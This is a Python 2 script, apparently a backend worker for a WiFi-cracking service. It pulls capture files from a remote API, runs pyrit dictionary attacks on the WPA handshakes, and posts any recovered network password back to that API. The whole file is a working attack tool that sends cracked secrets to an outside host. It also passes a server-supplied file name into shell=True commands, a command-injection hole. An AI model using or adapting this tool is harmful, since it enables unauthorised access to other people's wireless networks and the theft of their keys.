import os
import csv
import signal
import StringIO
import subprocess
import time
import request
import requests
import json
import sys

headers = {'content-type': 'application/x-www-form-urlencoded'}

r2 = requests.post('https://granadaapi.securipy.com/auth/login', data = {'email':'your@email.com','password':'password'})
print r2.headers
data = json.loads(r2.text)
token = data['result']
print data['result']


headers = {'content-type': 'application/x-www-form-urlencoded','GRANADA-TOKEN':token}




r = requests.get('https://granadaapi.securipy.com/wifi/getelementprocess',headers=headers)
print r.text

data = json.loads(r.text)
if data['response'] == True and data['result']:
    filecap = '../pcap/'+data['result']['file']
    id_wifi = data['result']['id']
    mac = data['result']['mac']

    print mac
    print id_wifi
#filecap = 'Pisito-02.cap'


#salida = ""
    proc = subprocess.Popen('pyrit -r '+filecap+' analyze >testfile.log 2>&1', bufsize=0,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
    proc.communicate()
    salida = open('testfile.log', 'r')
    error = False
    for line in salida:
        if 'No valid EAOPL-handshake + ESSID detected' in line:
            error = True



    if error:
       # print mac
       # print id_wifi 
        r2 = requests.post('https://granadaapi.securipy.com/wifi/crack', data = {'id':id_wifi,'mac':mac,'error':'No valid EAOPL-handshake + ESSID detected','process':5},headers=headers)
               # print r2.text
        print "La has liado"
        exit()

    proc = subprocess.Popen('pyrit -r '+filecap+'  -i ../dics/dic.txt -o clave.txt attack_passthrough >testfile.log 2>&1', bufsize=0,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
    proc.communicate()
    salida = open('testfile.log', 'r')
    error = False
    for line in salida:
        if '--all-handshakes' in line:
            error = True


    if error:
        proc = subprocess.Popen('pyrit -r '+filecap+' -i ../dics/dic.txt -o clave.txt --all-handshakes attack_passthrough >testfile.log 2>&1', bufsize=0,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
        proc.communicate()

    passwd = open('testfile.log','r')
    for line in passwd:
        if 'Password was not found.' in line:
            print "Sin pass"
            #r2 = requests.put('https://granadaapi.securipy.com/wifi/crack', data = {'id':id_wifi,'mac':mac,'error':'Password was not found.','process':4})
            r2 = requests.post('https://granadaapi.securipy.com/wifi/crack', data = {'id':id_wifi,'mac':mac,'error':'Password was not found.','process':4},headers=headers,stream=True)
            print r2.text
        elif 'The password is' in line:
            clave = open('clave.txt','r').read()
            r2 = requests.post('https://granadaapi.securipy.com/wifi/crack', data = {'id':id_wifi,'mac':mac,'password':clave,'process':4},headers=headers)
            print clave
        #print line


#proc = subprocess.Popen(['pyrit'] +['-r', 'Pisito1-04.cap']+ ['analyze'], bufsize=0,stdout=salida,stderr=salida)
    salida.close()

#os.killpg(os.getpgid(proc.pid), signal.SIGTERM) 

#proc.kill()
#print proc
#salida.close()

#print os.read(salida)
else:
    print "nada que procesar"


#print salida.find('No valid EAOPL-handshake + ESSID detected.')
